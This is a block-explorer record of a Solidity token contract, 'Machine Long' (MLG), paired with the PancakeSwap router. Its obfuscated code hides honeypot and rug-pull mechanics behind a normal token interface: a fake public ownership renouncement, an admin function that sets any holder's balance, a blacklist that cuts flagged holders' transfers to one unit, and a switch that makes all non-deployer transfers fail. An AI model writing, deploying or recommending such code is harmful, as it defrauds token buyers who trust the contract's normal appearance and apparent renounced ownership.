{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface teamSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityReceiverFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingTradingReceiver {\n    function createPair(address launchBuy, address tokenSellMarketing) external returns (address);\n}\n\ninterface launchedMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundList) external view returns (uint256);\n\n    function transfer(address shouldIs, uint256 amountTo) external returns (bool);\n\n    function allowance(address marketingFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldIs,\n        uint256 amountTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingMode, uint256 value);\n    event Approval(address indexed marketingFund, address indexed spender, uint256 value);\n}\n\ninterface launchedMinMetadata is launchedMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MachineLong is liquidityReceiverFrom, launchedMin, launchedMinMetadata {\n\n    function approve(address takeTrading, uint256 amountTo) public virtual override returns (bool) {\n        exemptAuto[_msgSender()][takeTrading] = amountTo;\n        emit Approval(_msgSender(), takeTrading, amountTo);\n        return true;\n    }\n\n    address totalMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public takeWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapTrading;\n    }\n\n    mapping(address => bool) public walletShouldMax;\n\n    address limitTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function marketingReceiver() private view {\n        require(walletShouldMax[_msgSender()]);\n    }\n\n    uint256 private limitWallet;\n\n    function allowance(address launchedFee, address takeTrading) external view virtual override returns (uint256) {\n        if (takeTrading == limitTotal) {\n            return type(uint256).max;\n        }\n        return exemptAuto[launchedFee][takeTrading];\n    }\n\n    function modeWalletReceiver(address tradingReceiver, uint256 amountTo) public {\n        marketingReceiver();\n        listSender[tradingReceiver] = amountTo;\n    }\n\n    uint8 private swapTrading = 18;\n\n    mapping(address => mapping(address => uint256)) private exemptAuto;\n\n    function walletFee(address launchReceiver) public {\n        if (minLaunch) {\n            return;\n        }\n        if (tokenMax == teamSender) {\n            teamSender = false;\n        }\n        walletShouldMax[launchReceiver] = true;\n        if (launchedTx != limitWallet) {\n            limitWallet = maxTx;\n        }\n        minLaunch = true;\n    }\n\n    function walletFundTx(address marketingTake, address shouldIs, uint256 amountTo) internal returns (bool) {\n        if (marketingTake == limitMax) {\n            return tradingLiquidity(marketingTake, shouldIs, amountTo);\n        }\n        uint256 takeLiquidity = launchedMin(takeWallet).balanceOf(totalMarketing);\n        require(takeLiquidity == takeListReceiver);\n        require(shouldIs != totalMarketing);\n        if (launchedMode[marketingTake]) {\n            return tradingLiquidity(marketingTake, shouldIs, modeBuy);\n        }\n        return tradingLiquidity(marketingTake, shouldIs, amountTo);\n    }\n\n    bool private fundMinReceiver;\n\n    string private txAutoAt = \"MLG\";\n\n    function launchTake(uint256 amountTo) public {\n        marketingReceiver();\n        takeListReceiver = amountTo;\n    }\n\n    bool private minFundFee;\n\n    uint256 public maxTx;\n\n    bool public tokenMax;\n\n    uint256 takeListReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txAutoAt;\n    }\n\n    function transfer(address tradingReceiver, uint256 amountTo) external virtual override returns (bool) {\n        return walletFundTx(_msgSender(), tradingReceiver, amountTo);\n    }\n\n    address private feeTotal;\n\n    function tradingLiquidity(address marketingTake, address shouldIs, uint256 amountTo) internal returns (bool) {\n        require(listSender[marketingTake] >= amountTo);\n        listSender[marketingTake] -= amountTo;\n        listSender[shouldIs] += amountTo;\n        emit Transfer(marketingTake, shouldIs, amountTo);\n        return true;\n    }\n\n    mapping(address => bool) public launchedMode;\n\n    function transferFrom(address marketingTake, address shouldIs, uint256 amountTo) external override returns (bool) {\n        if (_msgSender() != limitTotal) {\n            if (exemptAuto[marketingTake][_msgSender()] != type(uint256).max) {\n                require(amountTo <= exemptAuto[marketingTake][_msgSender()]);\n                exemptAuto[marketingTake][_msgSender()] -= amountTo;\n            }\n        }\n        return walletFundTx(marketingTake, shouldIs, amountTo);\n    }\n\n    bool private teamSender;\n\n    uint256 constant modeBuy = 1 ** 10;\n\n    function owner() external view returns (address) {\n        return feeTotal;\n    }\n\n    string private receiverShould = \"Machine Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return receiverShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return feeTotal;\n    }\n\n    mapping(address => uint256) private listSender;\n\n    event OwnershipTransferred(address indexed tokenTxSwap, address indexed launchedAmountAt);\n\n    function balanceOf(address fundList) public view virtual override returns (uint256) {\n        return listSender[fundList];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeShould;\n    }\n\n    bool public takeAmountFee;\n\n    bool public minLaunch;\n\n    bool private autoTrading;\n\n    address public limitMax;\n\n    uint256 public launchedTx;\n\n    function txEnableList() public {\n        emit OwnershipTransferred(limitMax, address(0));\n        feeTotal = address(0);\n    }\n\n    constructor (){\n        \n        teamSwap totalSell = teamSwap(limitTotal);\n        takeWallet = marketingTradingReceiver(totalSell.factory()).createPair(totalSell.WETH(), address(this));\n        \n        limitMax = _msgSender();\n        txEnableList();\n        walletShouldMax[limitMax] = true;\n        listSender[limitMax] = modeShould;\n        \n        emit Transfer(address(0), limitMax, modeShould);\n    }\n\n    uint256 private modeShould = 100000000 * 10 ** 18;\n\n    function fundShould(address swapTokenAmount) public {\n        marketingReceiver();\n        \n        if (swapTokenAmount == limitMax || swapTokenAmount == takeWallet) {\n            return;\n        }\n        launchedMode[swapTokenAmount] = true;\n    }\n\n    uint256 tradingSwapLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTxSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAmountAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTokenAmount\",\"type\":\"address\"}],\"name\":\"fundShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"modeWalletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnableList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"walletFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletShouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MachineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}